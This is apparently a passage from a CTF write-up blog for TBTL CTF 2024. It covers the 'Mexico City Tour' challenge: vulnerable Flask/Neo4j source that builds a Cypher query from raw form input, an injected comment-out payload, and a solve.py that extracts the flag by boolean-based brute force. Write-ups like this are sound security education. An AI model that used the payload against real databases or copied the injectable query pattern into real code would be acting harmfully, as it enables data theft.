+<p>flag: <strong>TBTL{d4T4_5c13nc3_15_n07_f0r_r0ck135}</strong></p>
+<h1 id="webmexico-city-tour" class="headerLink">
+    <a href="#webmexico-city-tour" class="header-mark"></a>web/Mexico City Tour</h1><p><code>#neo4j</code> <code>#graphql</code></p>
+<p>Injection challenge in neo4j graphql.</p>
+<blockquote>
+<p>The query searches a start station and end station id and does some calculation and returns the distance from each other. There is a station in which the flag is hidden. Another challenge is that it converts the distance returned from the query as an integer</p>
+</blockquote>
+<p>For my solution, I moslty read the docs and used chat-gpt for this challenge
+<a href="https://neo4j.com/docs/cypher-manual/current/functions/string/" target="_blank" rel="noopener noreferrer">https://neo4j.com/docs/cypher-manual/current/functions/string/</a></p>
+<p>I was trying to convert to ascii code initially but not able to make it work. This just became boolean-based injection in the end.</p>
+<p>source code</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">request</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">neo4j</span> <span class="kn">import</span> <span class="n">GraphDatabase</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">URI</span> <span class="o">=</span> <span class="s2">&#34;bolt://localhost:7687&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">AUTH</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">query</span><span class="p">(</span><span class="n">input_query</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">GraphDatabase</span><span class="o">.</span><span class="n">driver</span><span class="p">(</span><span class="n">URI</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="n">AUTH</span><span class="p">)</span> <span class="k">as</span> <span class="n">driver</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">driver</span><span class="o">.</span><span class="n">verify_connectivity</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">session</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">tx</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">begin_transaction</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">records</span> <span class="o">=</span> <span class="p">[</span><span class="n">t</span> <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">tx</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">input_query</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">tx</span><span class="o">.</span><span class="n">rollback</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">records</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">distance</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;distance&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">stations</span> <span class="o">=</span> <span class="n">query</span><span class="p">(</span><span class="s1">&#39;MATCH (n:Station) RETURN n.id, n.name ORDER BY n.id DESC;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">stations</span><span class="o">=</span><span class="n">stations</span><span class="p">,</span> <span class="n">distance</span><span class="o">=</span><span class="n">distance</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/search&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">search</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">start</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&#34;startStation&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">end</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;endStation&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">distance_query</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;MATCH (n </span><span class="se">{{</span><span class="s1">id: </span><span class="si">{</span><span class="n">start</span><span class="si">}</span><span class="se">}}</span><span class="s1">)-[p *bfs]-(m </span><span class="se">{{</span><span class="s1">id: </span><span class="si">{</span><span class="n">end</span><span class="si">}</span><span class="se">}}</span><span class="s1">) RETURN size(p) AS distance;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># distance_query = &#39;MATCH (n {id: city1})-[p *bfs]-(m {id: city2}) RETURN size(p) AS distance;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">distance</span> <span class="o">=</span> <span class="n">query</span><span class="p">(</span><span class="n">distance_query</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">distance</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">distance</span> <span class="o">=</span> <span class="s1">&#39;unknown&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">distance</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">distance</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;distance&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;.index&#39;</span><span class="p">,</span> <span class="n">distance</span><span class="o">=</span><span class="n">distance</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Initial query looks like this</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">distance_query</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;MATCH (n </span><span class="se">{{</span><span class="s1">id: </span><span class="si">{</span><span class="n">start</span><span class="si">}</span><span class="se">}}</span><span class="s1">)-[p *bfs]-(m </span><span class="se">{{</span><span class="s1">id: </span><span class="si">{</span><span class="n">end</span><span class="si">}</span><span class="se">}}</span><span class="s1">) RETURN size(p) AS distance;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># injected</span>
+</span></span><span class="line"><span class="cl"><span class="n">distance_query</span> <span class="o">=</span> <span class="s1">&#39;MATCH (n </span><span class="si">{id: 1}</span><span class="s1">)//})-[p *bfs]-(m </span><span class="si">{id: 2}</span><span class="s1">) RETURN size(p) AS distance;&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>sample payload wlll look like</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># returns 1 if substring index 0 of n.name is &#34;F&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;-1}) RETURN toInteger(replace(substring(n.name, 0, 1), </span><span class="se">\&#34;</span><span class="s2">F</span><span class="se">\&#34;</span><span class="s2">, </span><span class="se">\&#34;</span><span class="s2">1</span><span class="se">\&#34;</span><span class="s2">)) AS distance;//</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># payload injected</span>
+</span></span><span class="line"><span class="cl"><span class="n">distance_query</span> <span class="o">=</span> <span class="s1">&#39;MATCH (n {id: -1}) RETURN toInteger(replace(substring(n.flag,&#34;+str(i)+&#34;, 1), </span><span class="se">\&#34;</span><span class="s1">&#34;+q+&#34;</span><span class="se">\&#34;</span><span class="s1">, </span><span class="se">\&#34;</span><span class="s1">1337</span><span class="se">\&#34;</span><span class="s1">)) AS distance;//})-[p *bfs]-(m </span><span class="si">{id: 2}</span><span class="s1">) RETURN size(p) AS distance;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># })-[p *bfs]-(m {id: 2}) RETURN size(p) AS distance;  gets commented out</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>solve.py</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://tbtl-mexico-city-tour.chals.io/search&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># distance_query = &#39;MATCH (n {id: 1})//})-[p *bfs]-(m {id: 2}) RETURN size(p) AS distance;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">querier</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">q</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># generate a single query</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;-1}) RETURN toInteger(replace(substring(n.flag,&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;, 1), </span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">q</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">, </span><span class="se">\&#34;</span><span class="s2">1337</span><span class="se">\&#34;</span><span class="s2">)) AS distance;//&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;startStation&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;endStation&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">data</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_min</span> <span class="o">=</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_max</span> <span class="o">=</span> <span class="mi">126</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">30</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">_min</span><span class="p">,</span> <span class="n">_max</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">q</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">querier</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">q</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;1337&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">flag</span> <span class="o">+=</span> <span class="n">q</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>flag: <strong>TBTL{wh3R3_15_mY_GR4PH_h1dd3n}</strong></p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-05-12</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="https://xeunwa.github.io/tbtlctf-2024/" data-title="TBTL CTF 2024 - web(4x) writeups" data-hashtags="indexedDB,GraphQL,Neo4J,pandas,python,code-review,lfi,php"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Instapaper" data-sharer="instapaper" data-url="https://xeunwa.github.io/tbtlctf-2024/" data-title="TBTL CTF 2024 - web(4x) writeups" data-description="indexedDB, LFI, CSV, Boolean-based Neo4j Injection"><span data-svg-src="/lib/simple-icons/icons/instapaper.min.svg"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/indexeddb/">IndexedDB</a>,&nbsp;<a href="/tags/graphql/">GraphQL</a>,&nbsp;<a href="/tags/neo4j/">Neo4J</a>,&nbsp;<a href="/tags/pandas/">Pandas</a>,&nbsp;<a href="/tags/python/">Python</a>,&nbsp;<a href="/tags/code-review/">Code Review</a>,&nbsp;<a href="/tags/lfi/">Lfi</a>,&nbsp;<a href="/tags/php/">Php</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/umdctf-2024/" class="prev" rel="prev" title="UMDCTF 2024 - web(2x) writeups"><i class="fas fa-angle-left fa-fw"></i>UMDCTF 2024 - web(2x) writeups</a>
+            <a href="/time-traveler/" class="next" rel="next" title="osu!gaming CTF 2024 - osint/time-traveler">osu!gaming CTF 2024 - osint/time-traveler<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.131.0">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{},"data":{"desktop-header-typeit":"xeunwa","mobile-header-typeit":"xeunwa"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":true,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":300,"threshold":0.1,"type":"fuse","useExtendedSearch":false},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+</body>
+
+</html>
